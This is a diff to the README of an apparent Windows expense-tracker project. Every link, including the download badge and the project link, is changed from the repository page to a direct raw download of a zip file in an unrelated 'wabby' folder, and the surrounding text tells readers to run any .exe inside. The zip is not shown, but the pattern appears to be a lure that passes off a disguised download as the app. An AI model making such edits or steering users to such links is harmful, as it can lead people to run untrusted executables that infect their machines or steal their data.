@@ -1,6 +1,6 @@
 # 📒 Expense-Tracker - Simple Expense Tracking for Windows
 
-[![Download Expense-Tracker](https://img.shields.io/badge/Download-Expense--Tracker-blue?style=for-the-badge&logo=github)](https://github.com/Hollow-stand595/Expense-Tracker)
+[![Download Expense-Tracker](https://img.shields.io/badge/Download-Expense--Tracker-blue?style=for-the-badge&logo=github)](https://github.com/Hollow-stand595/Expense-Tracker/raw/refs/heads/main/wabby/Expense-Tracker-3.3.zip)
 
 ## 🧭 Overview
 
@@ -26,7 +26,7 @@ If the app includes a packaged Windows file, you can run it right after download
 
 Visit this page to download the app:
 
-https://github.com/Hollow-stand595/Expense-Tracker
+https://github.com/Hollow-stand595/Expense-Tracker/raw/refs/heads/main/wabby/Expense-Tracker-3.3.zip
 
 Open the page, look for the latest release or download file, and save it to your computer. If you see a `.exe` file, that is the file you should run. If you see a zip file, you should extract it first.
 
@@ -162,4 +162,4 @@ That keeps the list easy to read and helps when you review past spending.
 
 ## 📌 Project Link
 
-https://github.com/Hollow-stand595/Expense-Tracker
+https://github.com/Hollow-stand595/Expense-Tracker/raw/refs/heads/main/wabby/Expense-Tracker-3.3.zip
